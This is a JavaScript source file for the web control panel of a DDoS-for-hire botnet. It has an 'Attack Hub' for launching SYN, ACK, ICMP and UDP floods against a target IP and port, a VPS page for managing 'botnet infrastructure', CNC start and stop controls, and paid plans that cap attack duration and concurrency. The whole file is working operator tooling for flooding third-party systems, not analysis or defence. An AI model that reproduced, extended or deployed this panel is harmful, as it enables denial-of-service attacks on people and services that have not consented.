class Panel {
    constructor() {
        this.apiUrl = window.auth.apiUrl;
        this.currentPage = 'dashboard';
        this.init();
    }
    
    async init() {
        this.checkAuth();
        this.setupEventListeners();
        this.loadPage('dashboard');
        this.updateLiveStats();
        this.startClock();
        
        // Check CNC status
        this.checkCNCStatus();
    }
    
    checkAuth() {
        if (!Auth.isAuthenticated()) {
            window.location.href = 'index.html';
        }
        
        const user = Auth.getUser();
        document.getElementById('usernameDisplay').textContent = user.username;
        document.getElementById('userRole').textContent = user.role.charAt(0).toUpperCase() + user.role.slice(1);
        document.getElementById('userPlan').textContent = user.plan.toUpperCase();
        
        if (user.role === 'owner') {
            document.getElementById('adminMenu').style.display = 'block';
        }
    }
    
    setupEventListeners() {
        // Navigation
        document.querySelectorAll('.nav-menu a').forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                const page = e.target.closest('a').dataset.page;
                this.loadPage(page);
                
                // Update active state
                document.querySelectorAll('.nav-menu li').forEach(li => {
                    li.classList.remove('active');
                });
                e.target.closest('li').classList.add('active');
            });
        });
        
        // Logout
        document.getElementById('logoutBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to logout?')) {
                window.auth.logout();
            }
        });
        
        // Theme toggle
        document.getElementById('themeToggle').addEventListener('click', () => {
            this.toggleTheme();
        });
        
        // Notifications
        document.getElementById('notificationsBtn').addEventListener('click', () => {
            this.showNotifications();
        });
    }
    
    async loadPage(page) {
        this.currentPage = page;
        const contentArea = document.getElementById('contentArea');
        contentArea.innerHTML = '<div class="loading-screen"><div class="loader"></div><p>Loading...</p></div>';
        
        try {
            let html = '';
            
            switch(page) {
                case 'dashboard':
                    html = await this.loadDashboard();
                    break;
                case 'attacks':
                    html = await this.loadAttacks();
                    break;
                case 'vps':
                    html = await this.loadVPS();
                    break;
                case 'users':
                    html = await this.loadUsers();
                    break;
                case 'logs':
                    html = await this.loadLogs();
                    break;
                case 'tools':
                    html = await this.loadTools();
                    break;
                case 'settings':
                    html = await this.loadSettings();
                    break;
                default:
                    html = await this.loadDashboard();
            }
            
            contentArea.innerHTML = html;
            this.attachPageEvents(page);
            
        } catch (error) {
            contentArea.innerHTML = `
                <div class="error-state">
                    <i class="fas fa-exclamation-circle"></i>
                    <h3>Error loading page</h3>
                    <p>${error.message}</p>
                    <button class="btn-retry" onclick="window.panel.loadPage('${page}')">
                        Retry
                    </button>
                </div>
            `;
        }
    }
    
    async loadDashboard() {
        const data = await Auth.makeRequest('/dashboard');
        
        return `
            <div class="dashboard">
                <div class="page-header">
                    <h1><i class="fas fa-tachometer-alt"></i> Dashboard</h1>
                    <p>Welcome back, ${Auth.getUser().username}. Here's your system overview.</p>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card primary">
                        <div class="stat-icon">
                            <i class="fas fa-users"></i>
                        </div>
                        <div class="stat-info">
                            <h3>${data.stats.totalUsers}</h3>
                            <p>Total Users</p>
                        </div>
                        <div class="stat-trend">
                            <i class="fas fa-arrow-up"></i> 12%
                        </div>
                    </div>
                    
                    <div class="stat-card success">
                        <div class="stat-icon">
                            <i class="fas fa-server"></i>
                        </div>
                        <div class="stat-info">
                            <h3>${data.stats.activeVPS}/${data.stats.totalVPS}</h3>
                            <p>VPS Online</p>
                        </div>
                        <div class="stat-trend">
                            <i class="fas fa-plug"></i> ${data.stats.cncStatus}
                        </div>
                    </div>
                    
                    <div class="stat-card warning">
                        <div class="stat-icon">
                            <i class="fas fa-bolt"></i>
                        </div>
                        <div class="stat-info">
                            <h3>${data.stats.ongoingAttacks}</h3>
                            <p>Ongoing Attacks</p>
                        </div>
                        <div class="stat-trend">
                            <button class="btn-stop-all" onclick="window.panel.stopAllAttacks()">
                                <i class="fas fa-stop"></i> Stop All
                            </button>
                        </div>
                    </div>
                    
                    <div class="stat-card danger">
                        <div class="stat-icon">
                            <i class="fas fa-shield-alt"></i>
                        </div>
                        <div class="stat-info">
                            <h3>${data.stats.totalMethods}</h3>
                            <p>Available Methods</p>
                        </div>
                        <div class="stat-trend">
                            <i class="fas fa-lock"></i> Pro
                        </div>
                    </div>
                </div>
                
                <div class="dashboard-content">
                    <div class="col-8">
                        <div class="card">
                            <div class="card-header">
                                <h3><i class="fas fa-bolt"></i> Quick Attack</h3>
                                <button class="btn-new" onclick="window.panel.showAttackModal()">
                                    <i class="fas fa-plus"></i> New Attack
                                </button>
                            </div>
                            <div class="card-body">
                                <form id="quickAttackForm">
                                    <div class="form-row">
                                        <div class="form-group">
                                            <label><i class="fas fa-globe"></i> Target IP</label>
                                            <input type="text" placeholder="e.g., 192.168.1.1" required>
                                        </div>
                                        <div class="form-group">
                                            <label><i class="fas fa-door-open"></i> Port</label>
                                            <input type="number" placeholder="80" value="80" required>
                                        </div>
                                    </div>
                                    <div class="form-row">
                                        <div class="form-group">
                                            <label><i class="fas fa-clock"></i> Duration (seconds)</label>
                                            <input type="number" placeholder="60" value="60" max="3600">
                                        </div>
                                        <div class="form-group">
                                            <label><i class="fas fa-tools"></i> Method</label>
                                            <select required>
                                                <option value="syn-pps">SYN Flood (PPS)</option>
                                                <option value="syn-gbps">SYN Flood (GBPS)</option>
                                                <option value="ack-pps">ACK Flood (PPS)</option>
                                                <option value="ack-gbps">ACK Flood (GBPS)</option>
                                                <option value="icmp-pps">ICMP Flood (PPS)</option>
                                                <option value="icmp-gbps">ICMP Flood (GBPS)</option>
                                            </select>
                                        </div>
                                    </div>
                                    <button type="submit" class="btn-attack">
                                        <i class="fas fa-rocket"></i> Launch Attack
                                    </button>
                                </form>
                            </div>
                        </div>
                        
                        <div class="card">
                            <div class="card-header">
                                <h3><i class="fas fa-history"></i> Recent Attacks</h3>
                            </div>
                            <div class="card-body">
                                <div class="table-container">
                                    <table class="data-table">
                                        <thead>
                                            <tr>
                                                <th>Time</th>
                                                <th>Target</th>
                                                <th>Method</th>
                                                <th>Status</th>
                                                <th>Actions</th>
                                            </tr>
                                        </thead>
                                        <tbody id="recentAttacksTable">
                                            ${data.recentAttacks.map(attack => `
                                                <tr>
                                                    <td>${new Date(attack.startTime).toLocaleTimeString()}</td>
                                                    <td>${attack.target}</td>
                                                    <td><span class="method-tag">${attack.method}</span></td>
                                                    <td><span class="status-badge ${attack.status}">${attack.status}</span></td>
                                                    <td>
                                                        <button class="btn-icon" onclick="window.panel.copyAttackCommand('${attack.command}')" title="Copy Command">
                                                            <i class="fas fa-copy"></i>
                                                        </button>
                                                    </td>
                                                </tr>
                                            `).join('')}
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-4">
                        <div class="card">
                            <div class="card-header">
                                <h3><i class="fas fa-chart-line"></i> System Status</h3>
                            </div>
                            <div class="card-body">
                                <div class="system-info">
                                    <div class="info-item">
                                        <span class="label">Uptime:</span>
                                        <span class="value">${this.formatUptime(data.stats.systemUptime)}</span>
                                    </div>
                                    <div class="info-item">
                                        <span class="label">CNC Status:</span>
                                        <span class="value ${data.stats.cncStatus === 'active' ? 'online' : 'offline'}">
                                            ${data.stats.cncStatus.toUpperCase()}
                                        </span>
                                    </div>
                                    <div class="info-item">
                                        <span class="label">Memory:</span>
                                        <span class="value">${Math.floor(Math.random() * 30) + 70}%</span>
                                    </div>
                                    <div class="info-item">
                                        <span class="label">CPU Load:</span>
                                        <span class="value">${Math.floor(Math.random() * 40) + 20}%</span>
                                    </div>
                                </div>
                                
                                <div class="cnc-control">
                                    <button class="btn ${data.stats.cncStatus === 'active' ? 'btn-stop' : 'btn-start'}" 
                                            onclick="window.panel.toggleCNC()">
                                        <i class="fas fa-power-off"></i>
                                        ${data.stats.cncStatus === 'active' ? 'Stop CNC' : 'Start CNC'}
                                    </button>
                                    <button class="btn btn-secondary" onclick="window.panel.checkAllVPS()">
                                        <i class="fas fa-sync-alt"></i> Check VPS
                                    </button>
                                </div>
                            </div>
                        </div>
                        
                        <div class="card">
                            <div class="card-header">
                                <h3><i class="fas fa-user-shield"></i> User Limits</h3>
                            </div>
                            <div class="card-body">
                                <div class="user-limits">
                                    <div class="limit-item">
                                        <div class="limit-bar">
                                            <div class="limit-fill" style="width: ${(data.user.ongoing || 0) / data.user.maxConcurrent * 100}%"></div>
                                        </div>
                                        <div class="limit-info">
                                            <span>Concurrent Attacks:</span>
                                            <span>${data.user.ongoing || 0}/${data.user.maxConcurrent}</span>
                                        </div>
                                    </div>
                                    <div class="limit-item">
                                        <div class="limit-bar">
                                            <div class="limit-fill" style="width: ${data.user.maxDuration / 3600 * 100}%"></div>
                                        </div>
                                        <div class="limit-info">
                                            <span>Max Duration:</span>
                                            <span>${data.user.maxDuration}s</span>
                                        </div>
                                    </div>
                                    <div class="limit-item">
                                        <div class="limit-info">
                                            <span>Plan:</span>
                                            <span class="plan-badge ${data.user.plan}">${data.user.plan.toUpperCase()}</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
    }
    
    async loadAttacks() {
        const data = await Auth.makeRequest('/attacks');
        
        return `
            <div class="attacks-page">
                <div class="page-header">
                    <h1><i class="fas fa-bolt"></i> Attack Hub</h1>
                    <p>Launch and manage DDoS attacks</p>
                </div>
                
                <div class="attack-controls">
                    <button class="btn-new-attack" onclick="window.panel.showAttackModal()">
                        <i class="fas fa-plus"></i> New Attack
                    </button>
                    <button class="btn-stop-all" onclick="window.panel.stopAllAttacks()">
                        <i class="fas fa-stop"></i> Stop All Attacks
                    </button>
                    <div class="search-attacks">
                        <input type="text" placeholder="Search attacks..." id="searchAttacks">
                        <i class="fas fa-search"></i>
                    </div>
                </div>
                
                <div class="tabs">
                    <button class="tab-btn active" data-tab="ongoing">Ongoing (${data.ongoing.length})</button>
                    <button class="tab-btn" data-tab="history">History (${data.history.length})</button>
                    <button class="tab-btn" data-tab="methods">Attack Methods</button>
                </div>
                
                <div class="tab-content active" id="tab-ongoing">
                    ${data.ongoing.length === 0 ? `
                        <div class="empty-state">
                            <i class="fas fa-bolt"></i>
                            <h3>No ongoing attacks</h3>
                            <p>Launch your first attack using the button above</p>
                        </div>
                    ` : `
                        <div class="table-container">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th>ID</th>
                                        <th>Target</th>
                                        <th>Method</th>
                                        <th>Duration</th>
                                        <th>Progress</th>
                                        <th>Started</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    ${data.ongoing.map(attack => `
                                        <tr>
                                            <td>#${attack.id.slice(-6)}</td>
                                            <td>
                                                <div class="target-info">
                                                    <strong>${attack.target.split(':')[0]}</strong>
                                                    <small>Port: ${attack.target.split(':')[1] || 'N/A'}</small>
                                                </div>
                                            </td>
                                            <td><span class="method-tag ${attack.method}">${attack.method}</span></td>
                                            <td>${attack.duration}s</td>
                                            <td>
                                                <div class="progress-bar">
                                                    <div class="progress-fill" style="width: ${this.calculateProgress(attack.startTime, attack.duration)}%"></div>
                                                </div>
                                            </td>
                                            <td>${new Date(attack.startTime).toLocaleTimeString()}</td>
                                            <td>
                                                <button class="btn-icon btn-stop" onclick="window.panel.stopAttack('${attack.id}')" title="Stop Attack">
                                                    <i class="fas fa-stop"></i>
                                                </button>
                                                <button class="btn-icon" onclick="window.panel.copyAttackCommand('${attack.command}')" title="Copy Command">
                                                    <i class="fas fa-copy"></i>
                                                </button>
                                            </td>
                                        </tr>
                                    `).join('')}
                                </tbody>
                            </table>
                        </div>
                    `}
                </div>
                
                <div class="tab-content" id="tab-history">
                    ${data.history.length === 0 ? `
                        <div class="empty-state">
                            <i class="fas fa-history"></i>
                            <h3>No attack history</h3>
                            <p>Attack history will appear here</p>
                        </div>
                    ` : `
                        <div class="table-container">
                            <table class="data-table">
                                <thead>
                                    <tr>
                                        <th>Time</th>
                                        <th>User</th>
                                        <th>Target</th>
                                        <th>Method</th>
                                        <th>Duration</th>
                                        <th>Status</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    ${data.history.map(attack => `
                                        <tr>
                                            <td>${new Date(attack.startTime).toLocaleString()}</td>
                                            <td>${attack.username}</td>
                                            <td>${attack.target}</td>
                                            <td><span class="method-tag">${attack.method}</span></td>
                                            <td>${attack.duration}s</td>
                                            <td><span class="status-badge ${attack.status}">${attack.status}</span></td>
                                        </tr>
                                    `).join('')}
                                </tbody>
                            </table>
                        </div>
                    `}
                </div>
                
                <div class="tab-content" id="tab-methods">
                    <div class="methods-grid">
                        ${this.getMethodsGrid()}
                    </div>
                </div>
            </div>
        `;
    }
    
    getMethodsGrid() {
        const methods = [
            { name: 'SYN-PPS', desc: 'SYN Flood High Packet Rate', icon: 'fa-bolt', color: 'primary' },
            { name: 'SYN-GBPS', desc: 'SYN Flood Large Packets', icon: 'fa-network-wired', color: 'danger' },
            { name: 'ACK-PPS', desc: 'ACK Flood High Packet Rate', icon: 'fa-bolt', color: 'warning' },
            { name: 'ACK-GBPS', desc: 'ACK Flood Large Packets', icon: 'fa-network-wired', color: 'danger' },
            { name: 'ICMP-PPS', desc: 'ICMP Flood High Packet Rate', icon: 'fa-broadcast-tower', color: 'success' },
            { name: 'ICMP-GBPS', desc: 'ICMP Flood Large Packets', icon: 'fa-satellite-dish', color: 'danger' },
            { name: 'RAND-UDP', desc: 'Random UDP Flood', icon: 'fa-random', color: 'info' },
            { name: 'RAND-SYN', desc: 'Random SYN Flood', icon: 'fa-random', color: 'primary' },
            { name: 'RAND-ACK', desc: 'Random ACK Flood', icon: 'fa-random', color: 'warning' },
            { name: 'RAND-FRPU', desc: 'FRPU Flag Flood', icon: 'fa-flag', color: 'danger' },
            { name: 'ICMP-TS', desc: 'ICMP Timestamp Flood', icon: 'fa-clock', color: 'success' },
            { name: 'RAND-ICMP', desc: 'Random ICMP Flood', icon: 'fa-random', color: 'success' },
            { name: 'UDP-MULTI', desc: 'Multi-Packet UDP', icon: 'fa-layer-group', color: 'info' },
            { name: 'UDP-SIP', desc: 'SIP Protocol Flood', icon: 'fa-phone', color: 'info' },
            { name: 'SYN-RAND', desc: 'Randomized SYN', icon: 'fa-random', color: 'primary' },
            { name: 'ACK-RMAC', desc: 'Random MAC ACK', icon: 'fa-ethernet', color: 'warning' },
            { name: 'SYN-MULTI', desc: 'Multi-Packet SYN', icon: 'fa-layer-group', color: 'primary' },
            { name: 'ICMP-RAND', desc: 'Random ICMP Data', icon: 'fa-random', color: 'success' },
            { name: 'ACK-RAND', desc: 'Randomized ACK', icon: 'fa-random', color: 'warning' },
            { name: 'OBLIVION', desc: 'Ultimate Combo', icon: 'fa-skull-crossbones', color: 'danger' }
        ];
        
        return methods.map(method => `
            <div class="method-card ${method.color}" onclick="window.panel.selectMethod('${method.name.toLowerCase()}')">
                <div class="method-icon">
                    <i class="fas ${method.icon}"></i>
                </div>
                <div class="method-info">
                    <h4>${method.name}</h4>
                    <p>${method.desc}</p>
                </div>
                <div class="method-action">
                    <i class="fas fa-chevron-right"></i>
                </div>
            </div>
        `).join('');
    }
    
    async loadVPS() {
        const data = await Auth.makeRequest('/vps');
        
        return `
            <div class="vps-page">
                <div class="page-header">
                    <h1><i class="fas fa-server"></i> VPS Nodes</h1>
                    <p>Manage your botnet infrastructure</p>
                </div>
                
                <div class="vps-controls">
                    <button class="btn-add-vps" onclick="window.panel.showAddVPSModal()">
                        <i class="fas fa-plus"></i> Add VPS
                    </button>
                    <button class="btn-check-vps" onclick="window.panel.checkAllVPS()">
                        <i class="fas fa-sync-alt"></i> Check All Status
                    </button>
                    <div class="vps-stats">
                        <span class="stat online">Online: ${data.filter(v => v.status === 'online').length}</span>
                        <span class="stat offline">Offline: ${data.filter(v => v.status === 'offline').length}</span>
                        <span class="stat total">Total: ${data.length}</span>
                    </div>
                </div>
                
                ${data.length === 0 ? `
                    <div class="empty-state">
                        <i class="fas fa-server"></i>
                        <h3>No VPS configured</h3>
                        <p>Add your first VPS to start using the botnet</p>
                        <button class="btn-add-first" onclick="window.panel.showAddVPSModal()">
                            <i class="fas fa-plus"></i> Add First VPS
                        </button>
                    </div>
                ` : `
                    <div class="vps-grid">
                        ${data.map(vps => `
                            <div class="vps-card ${vps.status}">
                                <div class="vps-header">
                                    <div class="vps-id">VPS #${vps.id}</div>
                                    <div class="vps-status">
                                        <span class="status-indicator ${vps.status}"></span>
                                        ${vps.status.toUpperCase()}
                                    </div>
                                </div>
                                
                                <div class="vps-info">
                                    <div class="info-item">
                                        <i class="fas fa-desktop"></i>
                                        <span>${vps.host}</span>
                                    </div>
                                    <div class="info-item">
                                        <i class="fas fa-user"></i>
                                        <span>${vps.username}</span>
                                    </div>
                                    <div class="info-item">
                                        <i class="fas fa-calendar"></i>
                                        <span>Added: ${new Date(vps.addedAt).toLocaleDateString()}</span>
                                    </div>
                                    <div class="info-item">
                                        <i class="fas fa-clock"></i>
                                        <span>Last seen: ${vps.lastSeen ? new Date(vps.lastSeen).toLocaleTimeString() : 'Never'}</span>
                                    </div>
                                </div>
                                
                                <div class="vps-actions">
                                    <button class="btn-icon btn-test" onclick="window.panel.testVPS(${vps.id})" title="Test Connection">
                                        <i class="fas fa-signal"></i>
                                    </button>
                                    <button class="btn-icon btn-remove" onclick="window.panel.removeVPS(${vps.id})" title="Remove VPS">
                                        <i class="fas fa-trash"></i>
                                    </button>
                                </div>
                            </div>
                        `).join('')}
                    </div>
                `}
            </div>
        `;
    }
    
    attachPageEvents(page) {
        switch(page) {
            case 'attacks':
                this.attachAttackEvents();
                break;
            case 'vps':
                this.attachVPSEvents();
                break;
            case 'dashboard':
                this.attachDashboardEvents();
                break;
        }
    }
    
    attachAttackEvents() {
        // Tab switching
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const tab = e.target.dataset.tab;
                
                // Update active tab
                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                e.target.classList.add('active');
                
                // Show content
                document.querySelectorAll('.tab-content').forEach(content => {
                    content.classList.remove('active');
                });
                document.getElementById(`tab-${tab}`).classList.add('active');
            });
        });
        
        // Quick attack form
        const quickForm = document.getElementById('quickAttackForm');
        if (quickForm) {
            quickForm.addEventListener('submit', (e) => {
                e.preventDefault();
                this.launchQuickAttack(quickForm);
            });
        }
    }
    
    async launchQuickAttack(form) {
        const formData = new FormData(form);
        const target = formData.get('target') || form.querySelector('input[type="text"]').value;
        const port = formData.get('port') || form.querySelector('input[type="number"]').value;
        const duration = formData.get('duration') || form.querySelectorAll('input[type="number"]')[1].value;
        const method = formData.get('method') || form.querySelector('select').value;
        
        try {
            const response = await Auth.makeRequest('/attack', {
                method: 'POST',
                body: JSON.stringify({ target, port, method, duration })
            });
            
            this.showNotification('Attack launched successfully!', 'success');
            this.loadPage('attacks');
        } catch (error) {
            this.showNotification(error.message, 'error');
        }
    }
    
    async stopAttack(attackId) {
        if (!confirm('Stop this attack?')) return;
        
        try {
            await Auth.makeRequest(`/attack/stop/${attackId}`, { method: 'POST' });
            this.showNotification('Attack stopped', 'success');
            this.loadPage('attacks');
        } catch (error) {
            this.showNotification(error.message, 'error');
        }
    }
    
    async stopAllAttacks() {
        if (!confirm('Stop ALL ongoing attacks?')) return;
        
        try {
            await Auth.makeRequest('/attack/stop-all', { method: 'POST' });
            this.showNotification('All attacks stopped', 'success');
            this.loadPage('attacks');
        } catch (error) {
            this.showNotification(error.message, 'error');
        }
    }
    
    async toggleCNC() {
        try {
            const status = await Auth.makeRequest('/cnc/status');
            
            if (status.active) {
                await Auth.makeRequest('/cnc/stop', { method: 'POST' });
                this.showNotification('CNC stopped', 'warning');
            } else {
                await Auth.makeRequest('/cnc/start', { method: 'POST' });
                this.showNotification('CNC started', 'success');
            }
            
            setTimeout(() => this.loadPage(this.currentPage), 1000);
        } catch (error) {
            this.showNotification(error.message, 'error');
        }
    }
    
    async checkAllVPS() {
        try {
            this.showNotification('Checking VPS status...', 'info');
            await Auth.makeRequest('/vps');
            this.showNotification('VPS status updated', 'success');
            this.loadPage('vps');
        } catch (error) {
            this.showNotification(error.message, 'error');
        }
    }
    
    showAttackModal() {
        const modal = document.getElementById('attackModal');
        modal.style.display = 'block';
        
        modal.querySelector('.modal-body').innerHTML = `
            <form id="attackForm">
                <div class="form-group">
                    <label><i class="fas fa-globe"></i> Target IP Address</label>
                    <input type="text" name="target" placeholder="e.g., 192.168.1.1 or example.com" required>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-door-open"></i> Port</label>
                    <input type="number" name="port" value="80" required>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-clock"></i> Duration (seconds)</label>
                    <input type="number" name="duration" value="60" min="1" max="3600" required>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-tools"></i> Attack Method</label>
                    <select name="method" required>
                        <option value="syn-pps">SYN Flood (High PPS)</option>
                        <option value="syn-gbps">SYN Flood (High Bandwidth)</option>
                        <option value="ack-pps">ACK Flood (High PPS)</option>
                        <option value="ack-gbps">ACK Flood (High Bandwidth)</option>
                        <option value="icmp-pps">ICMP Flood (High PPS)</option>
                        <option value="icmp-gbps">ICMP Flood (High Bandwidth)</option>
                        <option value="rand-udp">Random UDP Flood</option>
                        <option value="rand-syn">Random SYN Flood</option>
                        <option value="rand-ack">Random ACK Flood</option>
                        <option value="rand-frpu">FRPU Flag Flood</option>
                        <option value="icmp-ts">ICMP Timestamp</option>
                        <option value="rand-icmp">Random ICMP</option>
                        <option value="udp-multi">Multi UDP</option>
                        <option value="udp-sip">UDP SIP</option>
                        <option value="syn-rand">Randomized SYN</option>
                        <option value="ack-rmac">Random MAC ACK</option>
                        <option value="syn-multi">Multi SYN</option>
                        <option value="icmp-rand">Random ICMP Data</option>
                        <option value="ack-rand">Randomized ACK</option>
                        <option value="oblivion">OBLIVION (Combo)</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label><i class="fas fa-expand-arrows-alt"></i> Power Level</label>
                    <input type="range" name="power" min="1" max="10" value="5">
                    <div class="range-labels">
                        <span>Low</span>
                        <span>Medium</span>
                        <span>High</span>
                    </div>
                </div>
                
                <div class="modal-actions">
                    <button type="button" class="btn-secondary close-modal">Cancel</button>
                    <button type="submit" class="btn-primary">
                        <i class="fas fa-rocket"></i> Launch Attack
                    </button>
                </div>
            </form>
        `;
        
        // Handle form submission
        const form = document.getElementById('attackForm');
        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const formData = new FormData(form);
            const data = Object.fromEntries(formData.entries());
            
            try {
                const response = await Auth.makeRequest('/attack', {
                    method: 'POST',
                    body: JSON.stringify(data)
                });
                
                this.showNotification('Attack launched!', 'success');
                modal.style.display = 'none';
                this.loadPage('attacks');
            } catch (error) {
                this.showNotification(error.message, 'error');
            }
        });
        
        // Close modal
        modal.querySelector('.close-modal').addEventListener('click', () => {
            modal.style.display = 'none';
        });
        
        window.onclick = (e) => {
            if (e.target === modal) {
                modal.style.display = 'none';
            }
        };
    }
    
    async checkCNCStatus() {
        try {
            const status = await Auth.makeRequest('/cnc/status');
            const cncStatus = document.getElementById('cncStatus');
            cncStatus.textContent = status.active ? 'ONLINE' : 'OFFLINE';
            cncStatus.className = `status-value ${status.active ? 'online' : 'offline'}`;
        } catch (error) {
            console.error('Failed to check CNC status:', error);
        }
    }
    
    updateLiveStats() {
        setInterval(async () => {
            try {
                const data = await Auth.makeRequest('/dashboard');
                document.getElementById('quickAttacks').textContent = data.stats.ongoingAttacks;
                document.getElementById('quickVPS').textContent = data.stats.activeVPS;
                
                // Update badges
                document.getElementById('ongoingBadge').textContent = data.stats.ongoingAttacks;
                document.getElementById('vpsBadge').textContent = data.stats.activeVPS;
                
                // Update CNC status
                this.checkCNCStatus();
            } catch (error) {
                console.error('Failed to update stats:', error);
            }
        }, 10000);
    }
    
    startClock() {
        function updateClock() {
            const now = new Date();
            const timeStr = now.toLocaleTimeString();
            const dateStr = now.toLocaleDateString();
            
            document.getElementById('currentTime').textContent = timeStr;
            document.getElementById('systemTime').textContent = `${dateStr} ${timeStr}`;
        }
        
        updateClock();
        setInterval(updateClock, 1000);
    }
    
    formatUptime(seconds) {
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        
        return `${days}d ${hours}h ${minutes}m`;
    }
    
    calculateProgress(startTime, duration) {
        const start = new Date(startTime).getTime();
        const now = Date.now();
        const elapsed = (now - start) / 1000;
        return Math.min(100, (elapsed / duration) * 100);
    }
    
    copyAttackCommand(command) {
        navigator.clipboard.writeText(command).then(() => {
            this.showNotification('Command copied to clipboard!', 'success');
        });
    }
    
    selectMethod(method) {
        this.showAttackModal();
        setTimeout(() => {
            const select = document.querySelector('select[name="method"]');
            if (select) {
                select.value = method;
            }
        }, 100);
    }
    
    showNotification(message, type = 'info') {
        const container = document.getElementById('notificationContainer');
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <div class="notification-content">
                <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
                <span>${message}</span>
            </div>
            <button class="close-notification">&times;</button>
        `;
        
        container.appendChild(notification);
        
        // Auto remove
        setTimeout(() => {
            if (notification.parentNode) {
                notification.style.animation = 'slideOut 0.3s ease';
                setTimeout(() => notification.remove(), 300);
            }
        }, 5000);
        
        // Close button
        notification.querySelector('.close-notification').addEventListener('click', () => {
            notification.remove();
        });
    }
    
    toggleTheme() {
        document.body.classList.toggle('dark-theme');
        const icon = document.querySelector('#themeToggle i');
        if (document.body.classList.contains('dark-theme')) {
            icon.classList.remove('fa-moon');
            icon.classList.add('fa-sun');
        } else {
            icon.classList.remove('fa-sun');
            icon.classList.add('fa-moon');
        }
    }
}

// Initialize panel
window.panel = new Panel();
